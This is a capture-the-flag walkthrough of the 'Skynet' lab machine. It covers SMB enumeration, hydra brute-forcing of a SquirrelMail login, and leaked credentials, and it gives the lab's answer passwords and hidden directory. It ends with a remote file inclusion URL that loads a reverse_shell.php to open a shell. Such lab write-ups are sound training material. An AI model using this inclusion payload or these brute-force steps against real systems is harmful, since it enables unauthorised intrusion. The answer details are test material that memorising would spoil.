### Skynet

export IP=10.10.68.81

#### Deploy and compromise the vulnerable machine!

What is Miles password for his emails?
- cyborg007haloterminator


nmap scan:

![](../../img/Pasted%20image%2020220827201706.png)

Gobuster scan:

![](../../img/Pasted%20image%2020220827203111.png)

Looking at the pages on the browser, almost all pages return nothing, except the /squirrelmail, where we need to login our credentials:


![](../../img/Pasted%20image%2020220827203156.png)

Looking for other vectors of attack, we observed the smb port is open. We will try to enumerate the port using smbmap:

![](../../img/Pasted%20image%2020220827203243.png)

There are 2 directories of interest, the anonymous and the milesdyson share. We will open both directories and get all information we can get:

Anonymous is easy to open since it does not use credentials:

![](../../img/Pasted%20image%2020220827203357.png)

Opening up attention.txt file (after we get all files from the share)

![](../../img/Pasted%20image%2020220827203429.png)

Opening up log1.txt:

![](../../img/Pasted%20image%2020220827203447.png)

Other logs provide no details.

Since we have a possible wordlist of passwords to be used on user milesdyson, we can either use hydra or burpsuite to bruteforce login and provide us the correct password. I use hydra for this challenge:

![](../../img/Pasted%20image%2020220827203818.png)

After logging in the credentials on the /squirrelmail page, we are now inside miles's inbox:

![](../../img/Pasted%20image%2020220827204045.png)

We can check for email called 'Samba Password reset'

![](../../img/Pasted%20image%2020220827204115.png)

Message:

```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

Using these credentials, we can now login to miles' smb share:

![](../../img/Pasted%20image%2020220827204226.png)

We have noticed the /notes folder:

![](../../img/Pasted%20image%2020220827204438.png)

looking inside notes directory, all files have .md pdf files except important.txt:

![](../../img/Pasted%20image%2020220827204520.png)

These are the details of important.txt:

![](../../img/Pasted%20image%2020220827204601.png)


What is the hidden directory?
- /45kra24zxs28v3yd

We visit the page and we are greeted by a picture:

![](../../img/Pasted%20image%2020220827204644.png)


http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.68.81:80/reverse_shell.php?







